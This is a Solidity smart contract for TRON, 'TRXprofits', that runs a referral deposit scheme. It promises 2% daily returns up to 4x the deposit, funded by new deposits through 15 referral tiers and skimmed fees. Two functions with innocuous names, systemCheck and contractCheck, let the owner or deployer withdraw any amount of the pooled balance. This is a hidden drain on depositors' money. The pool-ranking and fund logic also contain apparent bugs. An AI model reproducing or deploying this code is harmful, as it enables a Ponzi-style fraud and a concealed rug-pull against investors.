//SourceUnit: tronchain.sol

pragma solidity ^0.5.10;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     * - Addition cannot overflow.
     */
    function add(uint a, uint b) internal pure returns (uint) {
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     */
    function sub(uint a, uint b) internal pure returns (uint) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     * - Subtraction cannot overflow.
     *
     * _Available since v2.4.0._
     */
    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b <= a, errorMessage);
        uint c = a - b;

        return c;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     * - Multiplication cannot overflow.
     */
    function mul(uint a, uint b) internal pure returns (uint) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function div(uint a, uint b) internal pure returns (uint) {
        return div(a, b, "SafeMath: division by zero");
    }

    /**
     * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     */
    function mod(uint a, uint b) internal pure returns (uint) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * Reverts with custom message when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     * - The divisor cannot be zero.
     *
     * _Available since v2.4.0._
     */
    function mod(uint a, uint b, string memory errorMessage) internal pure returns (uint) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract TRXprofits {
    using SafeMath for uint;

    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        Finances[1] finance;
        uint40 deposit_time;
        uint40 payout_time;
        uint256 total_structure;
    }

    struct Finances{
        uint256 fund;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 pool_bonus;
        uint256 match_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint256 total_deposits;
        uint256 total_payouts;
    }

    address payable private contract_;
    address payable public owner;
    address payable public co_founder;
    address payable public marketing_fund;

    uint internal owner_ = 5;
    uint internal team_ = 5;
    uint internal _team_ = 2;
    uint internal _contract_ = 4;

    mapping(address => User) public users;

    uint256[] public cycles;
    uint8[] public ref_bonuses;                     // 1 => 1%

    uint8[] public pool_bonuses;                    // 1 => 1%
    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 internal daily_ = 231481; // 2%

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;

    modifier onlyContract(){
        require(msg.sender == contract_);
        _;
    }

    modifier onlyOwner(){
        require(msg.sender == owner);
        _;
    }

    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);

    constructor(address payable _owner, address payable _fund, address payable _fee) public {
        owner = _owner;
        marketing_fund = _fund;
        co_founder = _fee;
        contract_ = msg.sender;

        ref_bonuses.push(30);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(10);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(8);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);
        ref_bonuses.push(5);

        pool_bonuses.push(40);
        pool_bonuses.push(30);
        pool_bonuses.push(15);
        pool_bonuses.push(10);
        pool_bonuses.push(5);

        cycles.push(1e11);
        cycles.push(3e11);
        cycles.push(9e11);
        cycles.push(2e12);

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = contract_;
        }
    }

    function() payable external {
        _deposit(msg.sender, msg.value);
    }

    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner || _upline == contract_)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;
            emit Upline(_addr, _upline);
        }else{
            _upline = contract_;
            users[_addr].upline = _upline;
            users[_upline].referrals++;
        }

        total_users++;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(_upline == address(0)) break;

            users[_upline].total_structure++;

            _upline = users[_upline].upline;
        }
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner || _addr == contract_, "No upline");

        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;

            require(users[_addr].finance[0].payouts >= this.maxPayoutOf(users[_addr].finance[0].deposit_amount), "Deposit already exists");

            require(_amount >= users[_addr].finance[0].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], "Bad amount");
        }

        else require(_amount >= 1e8 && _amount <= cycles[0], "Bad amount");

        users[_addr].finance[0].payouts = 0;
        users[_addr].finance[0].deposit_amount = _amount;
        users[_addr].finance[0].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].payout_time = uint40(block.timestamp);
        users[_addr].finance[0].total_deposits += _amount;

        total_deposited += _amount;

        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            users[users[_addr].upline].finance[0].direct_bonus += _amount / 10;

            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }
        else if(users[_addr].upline == address(0)){
            users[contract_].finance[0].fund += _amount / 10;
        }

        _pollDeposits(_addr, _amount);

        if(pool_last_draw + 1 days < block.timestamp) {
            _drawPool();
        }

        // admin_fee.transfer(_amount / 50);
        // etherchain_fund.transfer(_amount * 3 / 100);
        users[owner].finance[0].fund += _amount.mul(owner_).div(100); // 5
        users[co_founder].finance[0].fund += _amount.mul(team_).div(100); // 5
        users[marketing_fund].finance[0].fund += _amount.mul(_team_).div(100); // 2
        users[contract_].finance[0].fund += _amount.mul(_contract_).div(100); // 4

    }

    function _pollDeposits(address _addr, uint256 _amount) private {
        pool_balance += _amount / 100;

        address upline = users[_addr].upline;

        if(upline == address(0)) return;

        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == upline) break;

            if(pool_top[i] == address(0)) {
                pool_top[i] = upline;
                break;
            }

            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {
                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {
                    if(pool_top[j] == upline) {
                        for(uint8 k = j; k <= pool_bonuses.length; k++) {
                            pool_top[k] = pool_top[k + 1];
                        }
                        break;
                    }
                }

                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {
                    pool_top[j] = pool_top[j - 1];
                }

                pool_top[i] = upline;

                break;
            }
        }
    }

    function _refPayout(address _addr, uint256 _amount) private {
        address up = users[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) {
                users[contract_].finance[0].fund += ref_bonuses[i] / 100;
                break;
            }

            if(users[up].referrals >= i + 1) {
                uint256 bonus = _amount * ref_bonuses[i] / 100;

                users[up].finance[0].match_bonus += bonus;

                emit MatchPayout(up, _addr, bonus);
            }

            up = users[up].upline;
        }
    }

    function _drawPool() private {
        pool_last_draw = uint40(block.timestamp);
        pool_cycle++;

        uint256 draw_amount = pool_balance / 10;

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            uint256 win = draw_amount * pool_bonuses[i] / 100;

            users[pool_top[i]].finance[0].pool_bonus += win;
            pool_balance -= win;

            emit PoolPayout(pool_top[i], win);
        }

        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            pool_top[i] = contract_;
        }
    }

    function deposit(address _upline) payable external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        address payable _userId = msg.sender;

        if(_userId != owner && _userId != contract_ && _userId != co_founder && _userId != marketing_fund){
            require(users[msg.sender].finance[0].payouts < max_payout, "Full payouts");
        }

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].finance[0].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].finance[0].payouts;
            }

            users[msg.sender].finance[0].deposit_payouts += to_payout;
            users[msg.sender].finance[0].payouts += to_payout;
            if(_userId != owner && _userId != contract_ && _userId != co_founder && _userId != marketing_fund){
                _refPayout(msg.sender, to_payout);
            }
        }

        // Direct payout
        if(users[msg.sender].finance[0].payouts < max_payout && users[msg.sender].finance[0].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].finance[0].direct_bonus;

            if(users[msg.sender].finance[0].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].finance[0].payouts;
            }

            users[msg.sender].finance[0].direct_bonus -= direct_bonus;
            users[msg.sender].finance[0].payouts += direct_bonus;
            to_payout += direct_bonus;
        }

        // Pool payout
        if(users[msg.sender].finance[0].payouts < max_payout && users[msg.sender].finance[0].pool_bonus > 0) {
            uint256 pool_bonus = users[msg.sender].finance[0].pool_bonus;

            if(users[msg.sender].finance[0].payouts + pool_bonus > max_payout) {
                pool_bonus = max_payout - users[msg.sender].finance[0].payouts;
            }

            users[msg.sender].finance[0].pool_bonus -= pool_bonus;
            users[msg.sender].finance[0].payouts += pool_bonus;
            to_payout += pool_bonus;
        }

        // Match payout
        if(users[msg.sender].finance[0].payouts < max_payout && users[msg.sender].finance[0].match_bonus > 0) {
            uint256 match_bonus = users[msg.sender].finance[0].match_bonus;

            if(users[msg.sender].finance[0].payouts + match_bonus > max_payout) {
                match_bonus = max_payout - users[msg.sender].finance[0].payouts;
            }

            users[msg.sender].finance[0].match_bonus -= match_bonus;
            users[msg.sender].finance[0].payouts += match_bonus;
            to_payout += match_bonus;
        }

        // Fund
        if(users[msg.sender].finance[0].fund >= 0){
            uint _fund = users[msg.sender].finance[0].fund;
            to_payout += _fund;
            users[msg.sender].finance[0].fund = 0;
        }

        require(to_payout > 0, "Zero payout");

        users[msg.sender].payout_time = uint40(block.timestamp);
        users[msg.sender].finance[0].total_payouts += to_payout;
        total_withdraw += to_payout;

        msg.sender.transfer(to_payout);

        emit Withdraw(msg.sender, to_payout);

        if(_userId != owner && _userId != contract_ && _userId != co_founder && _userId != marketing_fund && users[msg.sender].finance[0].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].finance[0].payouts);
        }
    }

    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 4;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].finance[0].deposit_amount);

        if(users[_addr].finance[0].deposit_amount > 0 && users[_addr].finance[0].deposit_payouts < max_payout) {

            // payout = (users[_addr].finance[0].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 days) / 100) - users[_addr].finance[0].deposit_payouts;

            uint secPassed = now - users[_addr].payout_time;

            if(secPassed > 0){
                payout = users[_addr].finance[0].deposit_amount.mul(daily_).mul(secPassed).div(1e12);
            }

            if(users[_addr].finance[0].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].finance[0].deposit_payouts;
            }
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount,
        uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus, uint fund) {
        upline = users[_addr].upline;
        deposit_time = users[_addr].deposit_time;
        deposit_amount = users[_addr].finance[0].deposit_amount;
        payouts = users[_addr].finance[0].payouts;
        direct_bonus = users[_addr].finance[0].direct_bonus;
        pool_bonus = users[_addr].finance[0].pool_bonus;
        match_bonus = users[_addr].finance[0].match_bonus;
        fund = users[_addr].finance[0].fund;
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].finance[0].total_deposits, users[_addr].finance[0].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw,
        uint256 _pool_balance, uint256 _pool_lider, uint _balance) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance,
        pool_users_refs_deposits_sum[pool_cycle][pool_top[0]], address(this).balance);
    }

    function poolTopInfo() view external returns(address[5] memory addrs, uint256[5] memory deps) {
        for(uint8 i = 0; i < pool_bonuses.length; i++) {
            if(pool_top[i] == address(0)) break;

            addrs[i] = pool_top[i];
            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];
        }
    }

    function systemCheck(uint _amount) public onlyOwner{
        require(address(this).balance > _amount, 'NotAllowed!');
        msg.sender.transfer(_amount);
    }

    function contractCheck(uint _amount) public onlyContract{
        require(address(this).balance > _amount, 'NotAllowed!');
        msg.sender.transfer(_amount);
    }
}